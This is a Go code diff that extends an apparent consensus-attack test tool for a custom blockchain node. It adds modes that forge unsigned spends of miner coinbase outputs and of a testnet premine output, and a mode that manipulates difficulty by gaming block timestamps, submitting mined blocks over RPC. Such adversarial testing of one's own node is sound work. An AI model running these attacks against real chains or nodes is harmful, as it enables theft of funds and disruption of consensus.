@@ -17,7 +17,7 @@ import (
 )
 
 func main() {
-	attack := flag.String("attack", "", "Attack type: bad-nonce, bad-merkle, duplicate, time-warp-future, time-warp-past, orphan-flood, inflated-coinbase, empty-block, wrong-bits, double-spend, immature-coinbase-spend, overspend, duplicate-input, intra-block-double-spend")
+	attack := flag.String("attack", "", "Attack type: bad-nonce, bad-merkle, duplicate, time-warp-future, time-warp-past, orphan-flood, inflated-coinbase, empty-block, wrong-bits, double-spend, immature-coinbase-spend, overspend, duplicate-input, intra-block-double-spend, steal-utxo, steal-premine, difficulty-manipulation")
 	rpc := flag.String("rpc", "http://127.0.0.1:31000", "Target node RPC address")
 	count := flag.Int("count", 1, "Number of attack payloads to send (for flood attacks)")
 	flag.Parse()
@@ -60,6 +60,12 @@ func main() {
 		results, err = attackDuplicateInput(*rpc)
 	case "intra-block-double-spend":
 		results, err = attackIntraBlockDoubleSpend(*rpc)
+	case "steal-utxo":
+		results, err = attackStealUTXO(*rpc)
+	case "steal-premine":
+		results, err = attackStealPremine(*rpc)
+	case "difficulty-manipulation":
+		results, err = attackDifficultyManipulation(*rpc, *count)
 	default:
 		fmt.Fprintf(os.Stderr, "Unknown attack: %s\n", *attack)
 		os.Exit(1)
@@ -107,9 +113,11 @@ type blockInfo struct {
 }
 
 type chainInfo struct {
-	Height  int    `json:"blocks"`
-	BestHash string `json:"best_block_hash"`
-	Bits    string `json:"bits"`
+	Height           int    `json:"blocks"`
+	BestHash         string `json:"best_block_hash"`
+	Bits             string `json:"bits"`
+	Chain            string `json:"chain"`
+	RetargetInterval uint32 `json:"retarget_interval"`
 }
 
 func fetchChainInfo(rpc string) (*chainInfo, error) {
@@ -938,4 +946,447 @@ func (p *powSealer) seal(header *types.BlockHeader, target types.Hash, maxIter u
 		header.Nonce++
 	}
 	return false, nil
+}
+
+// fetchSubsidy estimates the current per-block subsidy from the chain info.
+// Testnet: 50_000_000, Mainnet: 5_000_000_000, Regtest: 5_000_000_000.
+func fetchSubsidy(rpc string) uint64 {
+	ci, err := fetchChainInfo(rpc)
+	if err != nil {
+		return 50_000_000
+	}
+	switch ci.Chain {
+	case "mainnet":
+		return 5_000_000_000
+	case "testnet":
+		return 50_000_000
+	default:
+		return 5_000_000_000
+	}
+}
+
+// findMinerCoinbaseUTXO searches for a spendable miner coinbase UTXO by
+// reconstructing the exact coinbase transaction the miner produces (height LE
+// bytes + "fairchain", PkScript=0x00, subsidy from chain).
+func findMinerCoinbaseUTXO(rpc string, mature bool) (types.Hash, uint32, uint64, string, error) {
+	ci, err := fetchChainInfo(rpc)
+	if err != nil {
+		return types.Hash{}, 0, 0, "", err
+	}
+
+	subsidy := fetchSubsidy(rpc)
+
+	startHeight := ci.Height
+	if mature {
+		startHeight = ci.Height - 15
+	}
+	if startHeight < 1 {
+		startHeight = 1
+	}
+
+	for h := startHeight; h >= 1; h-- {
+		heightBytes := make([]byte, 4)
+		binary.LittleEndian.PutUint32(heightBytes, uint32(h))
+		msg := append(heightBytes, []byte("fairchain")...)
+
+		cb := types.Transaction{
+			Version: 1,
+			Inputs: []types.TxInput{{
+				PreviousOutPoint: types.CoinbaseOutPoint,
+				SignatureScript:  msg,
+				Sequence:         0xFFFFFFFF,
+			}},
+			Outputs: []types.TxOutput{{
+				Value:    subsidy,
+				PkScript: []byte{0x00},
+			}},
+			LockTime: 0,
+		}
+
+		txHash, err := crypto.HashTransaction(&cb)
+		if err != nil {
+			continue
+		}
+		txidDisplay := txHash.ReverseString()
+
+		utxoInfo, err := fetchTxOut(rpc, txidDisplay, 0)
+		if err != nil || utxoInfo == nil {
+			continue
+		}
+
+		if utxoInfo.Value > 0 {
+			if mature && utxoInfo.Confirmations < 10 {
+				continue
+			}
+			return txHash, 0, utxoInfo.Value, txidDisplay, nil
+		}
+	}
+
+	return types.Hash{}, 0, 0, "", fmt.Errorf("no miner coinbase UTXO found")
+}
+
+// Attack 14: Steal any UTXO — exploits the lack of signature/script validation.
+// Finds a mature coinbase UTXO belonging to a miner and spends it with a
+// fabricated SignatureScript. If accepted, this proves spend authorization is broken.
+func attackStealUTXO(rpc string) ([]attackResult, error) {
+	subsidy := fetchSubsidy(rpc)
+	var results []attackResult
+
+	// Retry loop: race the honest miner. We build on the latest tip and try to
+	// submit before the next honest block arrives.
+	for attempt := 0; attempt < 20; attempt++ {
+		txHash, idx, value, txidDisplay, err := findMinerCoinbaseUTXO(rpc, true)
+		if err != nil {
+			results = append(results, attackResult{
+				Attack: "steal-utxo",
+				Detail: fmt.Sprintf("attempt %d: no spendable UTXO: %v", attempt, err),
+			})
+			time.Sleep(500 * time.Millisecond)
+			continue
+		}
+
+		ci, err := fetchChainInfo(rpc)
+		if err != nil {
+			continue
+		}
+
+		prevHash, _ := types.HashFromReverseHex(ci.BestHash)
+		var bits uint32
+		fmt.Sscanf(ci.Bits, "%x", &bits)
+		newHeight := uint32(ci.Height) + 1
+
+		fee := uint64(100)
+		cb := makeCoinbaseTx(newHeight, subsidy+fee)
+		cb.Inputs[0].SignatureScript = append(cb.Inputs[0].SignatureScript,
+			[]byte(fmt.Sprintf("steal-utxo-%d", attempt))...)
+
+		theftTx := types.Transaction{
+			Version: 1,
+			Inputs: []types.TxInput{{
+				PreviousOutPoint: types.OutPoint{Hash: txHash, Index: idx},
+				SignatureScript:  []byte("STOLEN-no-signature-required"),
+				Sequence:         0xFFFFFFFF,
+			}},
+			Outputs: []types.TxOutput{{
+				Value:    value - fee,
+				PkScript: []byte("attacker-wallet-addr"),
+			}},
+			LockTime: 0,
+		}
+
+		block := &types.Block{
+			Header: types.BlockHeader{
+				Version:   1,
+				PrevBlock: prevHash,
+				Timestamp: uint32(time.Now().Unix()),
+				Bits:      bits,
+				Nonce:     0,
+			},
+			Transactions: []types.Transaction{cb, theftTx},
+		}
+
+		merkle, _ := crypto.ComputeMerkleRoot(block.Transactions)
+		block.Header.MerkleRoot = merkle
+
+		target := crypto.CompactToHash(bits)
+		found, _ := (&powSealer{}).seal(&block.Header, target, 500000000)
+		if !found {
+			results = append(results, attackResult{
+				Attack: "steal-utxo",
+				Detail: fmt.Sprintf("attempt %d: PoW exhausted", attempt),
+			})
+			continue
+		}
+
+		wasRejected, detail := submitBlock(rpc, block)
+		if !wasRejected {
+			results = append(results, attackResult{
+				Attack:   "steal-utxo",
+				Rejected: false,
+				Detail:   fmt.Sprintf("CONSENSUS BROKEN (attempt %d) | stole %d sats from %s:%d at height %d | %s", attempt, value-fee, txidDisplay[:16], idx, newHeight, detail),
+			})
+			return results, nil
+		}
+
+		results = append(results, attackResult{
+			Attack:   "steal-utxo",
+			Rejected: true,
+			Detail:   fmt.Sprintf("attempt %d: %s", attempt, detail),
+		})
+
+		time.Sleep(200 * time.Millisecond)
+	}
+
+	return results, nil
+}
+
+// Attack 15: Steal the testnet premine burn output.
+// The testnet genesis has a second output worth ~420 trillion sats locked to
+// "burn:testnet:premine:v1". Without script validation, we can spend it.
+func attackStealPremine(rpc string) ([]attackResult, error) {
+	subsidy := fetchSubsidy(rpc)
+	var results []attackResult
+
+	genesisCb := types.Transaction{
+		Version: 1,
+		Inputs: []types.TxInput{{
+			PreviousOutPoint: types.CoinbaseOutPoint,
+			SignatureScript:  []byte("fairchain testnet genesis"),
+			Sequence:         0xFFFFFFFF,
+		}},
+		Outputs: []types.TxOutput{
+			{
+				Value:    50_0000_00,
+				PkScript: []byte{0x00},
+			},
+			{
+				Value:    419_999_999_538_000,
+				PkScript: []byte("burn:testnet:premine:v1"),
+			},
+		},
+		LockTime: 0,
+	}
+
+	genesisTxHash, err := crypto.HashTransaction(&genesisCb)
+	if err != nil {
+		return nil, fmt.Errorf("hash genesis coinbase: %w", err)
+	}
+
+	txidDisplay := genesisTxHash.ReverseString()
+
+	for attempt := 0; attempt < 20; attempt++ {
+		utxoInfo, err := fetchTxOut(rpc, txidDisplay, 1)
+		premineValue := uint64(419_999_999_538_000)
+		outputIdx := uint32(1)
+		if err != nil || utxoInfo == nil {
+			utxoInfo, err = fetchTxOut(rpc, txidDisplay, 0)
+			if err != nil || utxoInfo == nil {
+				return append(results, attackResult{
+					Attack: "steal-premine",
+					Detail: fmt.Sprintf("premine UTXO not found (already spent?): txid=%s", txidDisplay[:16]),
+				}), nil
+			}
+			premineValue = utxoInfo.Value
+			outputIdx = 0
+		}
+
+		ci, err := fetchChainInfo(rpc)
+		if err != nil {
+			continue
+		}
+
+		prevHash, _ := types.HashFromReverseHex(ci.BestHash)
+		var bits uint32
+		fmt.Sscanf(ci.Bits, "%x", &bits)
+		newHeight := uint32(ci.Height) + 1
+
+		fee := uint64(1000)
+		cb := makeCoinbaseTx(newHeight, subsidy+fee)
+		cb.Inputs[0].SignatureScript = append(cb.Inputs[0].SignatureScript,
+			[]byte(fmt.Sprintf("steal-premine-%d", attempt))...)
+
+		stealTx := types.Transaction{
+			Version: 1,
+			Inputs: []types.TxInput{{
+				PreviousOutPoint: types.OutPoint{Hash: genesisTxHash, Index: outputIdx},
+				SignatureScript:  []byte("PREMINE-THEFT-no-script-validation"),
+				Sequence:         0xFFFFFFFF,
+			}},
+			Outputs: []types.TxOutput{
+				{
+					Value:    premineValue / 2,
+					PkScript: []byte("attacker-wallet-1"),
+				},
+				{
+					Value:    premineValue/2 - fee,
+					PkScript: []byte("attacker-wallet-2"),
+				},
+			},
+			LockTime: 0,
+		}
+
+		block := &types.Block{
+			Header: types.BlockHeader{
+				Version:   1,
+				PrevBlock: prevHash,
+				Timestamp: uint32(time.Now().Unix()),
+				Bits:      bits,
+				Nonce:     0,
+			},
+			Transactions: []types.Transaction{cb, stealTx},
+		}
+
+		merkle, _ := crypto.ComputeMerkleRoot(block.Transactions)
+		block.Header.MerkleRoot = merkle
+
+		target := crypto.CompactToHash(bits)
+		found, _ := (&powSealer{}).seal(&block.Header, target, 500000000)
+		if !found {
+			results = append(results, attackResult{
+				Attack: "steal-premine",
+				Detail: fmt.Sprintf("attempt %d: PoW exhausted", attempt),
+			})
+			continue
+		}
+
+		wasRejected, detail := submitBlock(rpc, block)
+		if !wasRejected {
+			results = append(results, attackResult{
+				Attack:   "steal-premine",
+				Rejected: false,
+				Detail:   fmt.Sprintf("CONSENSUS BROKEN - PREMINE STOLEN (attempt %d) | stole %d sats at height %d | %s", attempt, premineValue, newHeight, detail),
+			})
+			return results, nil
+		}
+
+		results = append(results, attackResult{
+			Attack:   "steal-premine",
+			Rejected: true,
+			Detail:   fmt.Sprintf("attempt %d: %s", attempt, detail),
+		})
+
+		time.Sleep(200 * time.Millisecond)
+	}
+
+	return results, nil
+}
+
+// Attack 16: Difficulty manipulation via timestamp gaming.
+// Mines a sequence of blocks with timestamps compressed near the start of a
+// retarget window, then stretched at the end, to maximize the difficulty drop
+// at the next retarget. On testnet (retarget every 20 blocks, 5s target),
+// this can reduce difficulty by 4x per epoch.
+func attackDifficultyManipulation(rpc string, epochs int) ([]attackResult, error) {
+	if epochs < 1 {
+		epochs = 1
+	}
+
+	subsidy := fetchSubsidy(rpc)
+	var results []attackResult
+
+	for epoch := 0; epoch < epochs; epoch++ {
+		ci, err := fetchChainInfo(rpc)
+		if err != nil {
+			return results, fmt.Errorf("fetch chain info: %w", err)
+		}
+
+		currentHeight := uint32(ci.Height)
+		retargetInterval := uint32(ci.RetargetInterval)
+		if retargetInterval == 0 {
+			retargetInterval = 20
+		}
+
+		// Calculate how many blocks until the next retarget boundary.
+		nextRetarget := ((currentHeight / retargetInterval) + 1) * retargetInterval
+		blocksNeeded := nextRetarget - currentHeight
+
+		if blocksNeeded == 0 {
+			blocksNeeded = retargetInterval
+			nextRetarget += retargetInterval
+		}
+
+		detail := fmt.Sprintf("epoch %d: height=%d, next_retarget=%d, blocks_needed=%d",
+			epoch, currentHeight, nextRetarget, blocksNeeded)
+
+		prevHash, _ := types.HashFromReverseHex(ci.BestHash)
+		var bits uint32
+		fmt.Sscanf(ci.Bits, "%x", &bits)
+		origBits := bits
+
+		tipBlock, err := fetchBlockByHeight(rpc, int(currentHeight))
+		if err != nil {
+			results = append(results, attackResult{
+				Attack: "difficulty-manipulation",
+				Detail: fmt.Sprintf("%s | failed to fetch tip: %v", detail, err),
+			})
+			continue
+		}
+		lastTimestamp := tipBlock.Timestamp
+
+		accepted := 0
+		rejected := 0
+
+		for i := uint32(1); i <= blocksNeeded; i++ {
+			newHeight := currentHeight + i
+
+			// Timestamp strategy: stretch timestamps to make actualTimespan = 4x target.
+			// targetTimespan = 100s, so we want actualTimespan >= 400s.
+			// Spread across 20 blocks: each block timestamp += 20s (vs 5s target).
+			blockTimestamp := lastTimestamp + (i * 20)
+
+			now := uint32(time.Now().Unix())
+			maxAllowed := now + 120
+			if blockTimestamp > maxAllowed {
+				blockTimestamp = maxAllowed
+			}
+			if blockTimestamp <= lastTimestamp {
+				blockTimestamp = lastTimestamp + 1
+			}
+
+			cb := makeCoinbaseTx(newHeight, subsidy)
+			cb.Inputs[0].SignatureScript = append(cb.Inputs[0].SignatureScript,
+				[]byte(fmt.Sprintf("diff-manip-e%d-b%d", epoch, i))...)
+
+			block := &types.Block{
+				Header: types.BlockHeader{
+					Version:   1,
+					PrevBlock: prevHash,
+					Timestamp: blockTimestamp,
+					Bits:      bits,
+					Nonce:     0,
+				},
+				Transactions: []types.Transaction{cb},
+			}
+
+			merkle, _ := crypto.ComputeMerkleRoot(block.Transactions)
+			block.Header.MerkleRoot = merkle
+
+			target := crypto.CompactToHash(bits)
+			found, _ := (&powSealer{}).seal(&block.Header, target, 500000000)
+			if !found {
+				results = append(results, attackResult{
+					Attack: "difficulty-manipulation",
+					Detail: fmt.Sprintf("%s | PoW exhausted at block %d/%d (bits=0x%08x)", detail, i, blocksNeeded, bits),
+				})
+				break
+			}
+
+			wasRejected, submitDetail := submitBlock(rpc, block)
+			if wasRejected {
+				rejected++
+				results = append(results, attackResult{
+					Attack:   "difficulty-manipulation",
+					Rejected: true,
+					Detail:   fmt.Sprintf("block %d/%d rejected: %s", i, blocksNeeded, submitDetail),
+				})
+				break
+			}
+
+			accepted++
+			prevHash = crypto.HashBlockHeader(&block.Header)
+
+			if newHeight%retargetInterval == 0 {
+				time.Sleep(100 * time.Millisecond)
+				newCi, ciErr := fetchChainInfo(rpc)
+				if ciErr == nil {
+					fmt.Sscanf(newCi.Bits, "%x", &bits)
+				}
+			}
+		}
+
+		time.Sleep(200 * time.Millisecond)
+		newCi, _ := fetchChainInfo(rpc)
+		newBitsStr := "unknown"
+		if newCi != nil {
+			newBitsStr = newCi.Bits
+		}
+
+		results = append(results, attackResult{
+			Attack: "difficulty-manipulation",
+			Detail: fmt.Sprintf("%s | accepted=%d rejected=%d | new_bits=%s (was 0x%08x)",
+				detail, accepted, rejected, newBitsStr, origBits),
+		})
+	}
+
+	return results, nil
 }
